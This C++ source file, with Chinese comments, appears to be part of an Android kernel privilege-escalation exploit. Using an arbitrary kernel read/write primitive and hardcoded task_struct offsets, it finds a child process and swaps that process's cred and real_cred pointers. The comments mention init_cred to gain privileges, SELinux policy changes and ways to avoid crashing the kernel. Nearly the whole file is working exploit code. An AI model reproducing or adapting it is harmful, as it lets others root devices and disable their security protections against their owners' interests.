#include <cerrno>
#include <cstring>
#include <filesystem>
#include "../tools.h"
#include "const.h"
#include "../const.h"
#include <fstream>
#include "../prim/prim.h"
#include "misc.h"

#include <sys/wait.h>
// 换 cred 不增引用，异常退出会让 init_cred.usage −1~−2，
// 掉到 0 释放静态 init_cred ⇒ 内核崩。所以同次开机最好只改一次SELinux策略
void gate(Print &print) {
    std::string store_bid, bid;
    std::ofstream("/data/local/tmp/store_boot_id", std::ios::app).close(); //不存在则创建
    std::ifstream ifs("/data/local/tmp/store_boot_id");
    if (!ifs) {
        print("store_boot_id文件打开失败 ",strerror(errno));
        exit(1);
    }
    ifs >> store_bid;
    ifs = std::ifstream("/proc/sys/kernel/random/boot_id");
    if (!ifs) {
        print("boot_id文件打开失败 ",strerror(errno));
        exit(1);
    }
    ifs >> bid;
    if (store_bid == bid) {
        print("本次启动跑过exp且init_cred异常退出，引用计数减少，请重启设备恢复引用计数");
        exit(1);
    }
}

//把本地blob加载到内存
void blob2memory(Print &print) {
    print("把blob读到内存...");
    const char *PATH = "/data/local/tmp/blob.bin";
    std::ifstream ifs(PATH, std::ios::binary);
    if (!ifs) {
        print("blob.bin 文件打开失败");
        exit(1);
    }
    auto len = std::filesystem::file_size(PATH);
    if (len == 0) {
        print("blob.bin 文件大小为0");
        exit(1);
    }
    g_blob.resize(len);
    ifs.read(g_blob.data(), len);
    if (ifs.gcount() != len) {
        if (ifs.eof()) {
            print("blob.bin 提前读到eof (",ifs.gcount(),'/',len,")");
            exit(1);
        }
        else {
            print("blob.bin 文件读取失败");
            exit(1);
        }
    }
}

// 只取低 n 字节（n<=8）的可比掩码
unsigned long comm_low(const char *s, int n) {
    unsigned long v = 0;
    for (int i = 0; i < n; ++i)
        v |= (unsigned long) (unsigned char) s[i] << (8 * i);
    return v;
}

//传入当前task_struct（运行时地址），读取children.next，再读子进程的进程名
//两次读寄生写落点都是sched_info.pcount，寄生写再改回0，风险低
unsigned long find_child_task(unsigned long task, Print &print) {
    unsigned long parent_node = task + 2040;
    std::vector<unsigned long> data;
    Prim::getInstance().read_link(task + 1720 - kaslr_slide, data, 736 / 8, 0);
    Prim::getInstance().write_link(task + 1720 - kaslr_slide, 0, 2); //寄生写改成0
    unsigned long child_node = data[40];
    if (parent_node == child_node) {
        print("children 是空链表 ⇒ 子进程还没挂上/已经退出");
        exit(1);
    }
    if (!is_kptr(child_node)) {
        print("children 节点不像内核指针：", ultohex(child_node));
        exit(1);
    }
    task = child_node - 2056; // 注意parent.children->next不是children字段，是slibling
    Prim::getInstance().read_link(task + 1720 - kaslr_slide, data, 736 / 8, 0);
    Prim::getInstance().write_link(task + 1720 - kaslr_slide, 0, 2); //寄生写改成0
    child_cred_bak = *(data.rbegin()+1);
    child_real_cred_bak = *(data.rbegin()+2);
    print("子进程原cred指针备份完成 cred = ",ultohex(child_cred_bak)," real_cred = ",ultohex(child_real_cred_bak));
    unsigned long comm = *data.rbegin();
    if (comm != CHILD_COMM_HEAD) {
        print("子进程名匹配失败, comm = ", comm);
        exit(1);
    }
    return task;
}

void notify_child(ShareMem* sh, int cmd) {
    sh->cmd = cmd;
    ++sh->seq;
    while (sh->seq!= sh->ack) // 等待子进程完成命令
        asm("yield");
}

void read_comm_prev(unsigned long task, unsigned long &comm, unsigned long &prev_list_head) {
    std::vector<unsigned long> data;
    Prim::getInstance().read_link(task + 1720 - kaslr_slide, data, 736 / 8, 0);
    comm = *data.rbegin();
    prev_list_head = data[5];
    Prim::getInstance().write_link(task + 1720 - kaslr_slide, 0, 2); //寄生写改成0
}

void clean_child(pid_t child_pid, unsigned long child_task, ShareMem *sh) {
    Print print("clean_child");
    print("开始清理子进程");
    write_1_rt(child_task + OFF_REAL_CRED, child_real_cred_bak);
    write_1_rt(child_task + OFF_CRED, child_cred_bak);
    notify_child(sh, CMD_GETUID);
    if (sh->rc != 0) print("已把子进程换回原 cred：uid = ",sh->rc);
    else {
        print("警告：子进程cred没换回来，init_cred引用计数将增加，要再跑二进制请重启设备");
        std::ofstream ofs("/data/local/tmp/store_boot_id");
        if (!ofs) {
            print("store_boot_id文件打开失败 ",strerror(errno));
        }
        std::ifstream ifs("/proc/sys/kernel/random/boot_id");
        if (!ifs) {
            print("boot_id文件打开失败 ",strerror(errno));
        }
        std::string buf;
        ifs >> buf;
        ofs << buf; //用于gate()
    }
    if (kill(child_pid, SIGKILL) < 0) {
        print("kill子进程失败：",strerror(errno));
    }
    else print("kill子进程成功");
    if (waitpid(child_pid, nullptr, 0) < 0) {
        print("waitpid失败：",strerror(errno));
    }
    else print("waitpid成功");
}
